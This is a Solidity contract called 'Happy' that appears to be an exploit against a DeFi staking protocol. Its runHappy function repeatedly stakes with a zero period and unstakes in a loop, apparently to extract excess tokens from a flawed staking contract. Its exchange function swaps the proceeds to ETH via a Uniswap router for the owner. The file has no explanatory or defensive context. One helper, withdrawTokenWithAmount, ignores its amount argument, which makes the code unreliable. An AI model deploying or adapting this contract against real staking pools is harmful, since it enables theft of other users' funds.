pragma solidity 0.6.12;

import "./interfaces/IUniswapV2Router02.sol";
import "./interfaces/IERC20.sol";

interface IStaking {
    function stake(uint256 _period, uint256 _stakes) external;

    function unstake() external;
}

contract Happy {
    address owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    fallback() external {}

    constructor() public {
        owner = msg.sender;
    }

    function withdrawToken(address tokenAddress) external onlyOwner {
        IERC20(tokenAddress).transfer(
            owner,
            IERC20(tokenAddress).balanceOf(address(this))
        );
    }

    function withdrawTokenWithAmount(address tokenAddress, uint amount)
        external
        onlyOwner
    {
        IERC20(tokenAddress).transfer(
            owner,
            IERC20(tokenAddress).balanceOf(address(this))
        );
    }

    function withdraw(uint amount) external onlyOwner {
        payable(owner).transfer(amount);
    }

    function approve(address tokenAddress, address stakingAddress)
        external
        onlyOwner
    {
        IERC20(tokenAddress).approve(
            stakingAddress,
            0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        );
    }

    function runHappy(
        address tokenAddress,
        address stakingAddress,
        uint times
    ) external onlyOwner returns (uint) {
        for (uint i = 0; i < times; i++) {
            IStaking(stakingAddress).stake(
                0,
                IERC20(tokenAddress).balanceOf(address(this))
            );
            IStaking(stakingAddress).unstake();
        }
        return IERC20(tokenAddress).balanceOf(address(this));
    }

    function exchange(
        address tokenAddress,
        address routerAddress,
        uint amount
    ) external onlyOwner returns (uint) {
        IERC20(tokenAddress).approve(
            routerAddress,
            0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        );
        address[] memory path = new address[](2);
        path[0] = tokenAddress;
        path[1] = IUniswapV2Router02(routerAddress).WETH();
        uint[] memory expectAmounts = IUniswapV2Router02(routerAddress)
            .getAmountsOut(amount, path);

        IUniswapV2Router02(routerAddress)
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                amount,
                (expectAmounts[1] * 90) / 100,
                path,
                owner,
                block.timestamp
            );
        return owner.balance;
    }
}
